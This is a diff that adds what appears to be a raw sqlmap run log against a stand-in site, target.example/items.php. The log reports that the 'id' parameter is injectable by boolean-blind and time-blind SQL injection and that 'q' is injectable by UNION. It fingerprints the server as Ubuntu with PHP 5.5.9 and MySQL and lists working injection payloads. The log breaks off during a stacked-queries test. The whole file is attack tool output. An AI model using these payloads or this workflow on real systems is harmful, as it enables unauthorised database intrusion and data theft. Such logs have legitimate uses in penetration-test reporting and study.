@@ -1,0 +1,36 @@
+[*] starting at '16:20:01' https://target.example/items.php
+[INFO] testing connection to the target URL
+[INFO] testing if the target URL content is stable
+[INFO] target URL content is stable
+[INFO] testing if GET parameter 'id' is dynamic
+[INFO] GET parameter 'id' is dynamic
+[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[INFO] testing for SQL injection on GET parameter 'id'
+[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable, for 'MySQL'
+[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'
+[INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectable, for 'MySQL'
+it is recommended to perform only basic UNION tests if there is not at least one other (higher) DBMS technique detected
+[INFO] checking if the injection point on GET parameter 'id' is a false positive
+the injection point on GET parameter 'id' is not a false positive
+[INFO] POST parameter 'q' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.0
+[INFO] fetched data logged to text files under '/home/op/.sqlmap/output/target.example'
+
+---
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 5088=5088-- -
+
+---
+Parameter: q
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 to 20 columns
+    Payload: q=1' UNION ALL SELECT NULL,NULL,NULL-- -
+
+---
+[INFO] testing 'MySQL >= 5.7 and <= 8.0.23 stacked queries'
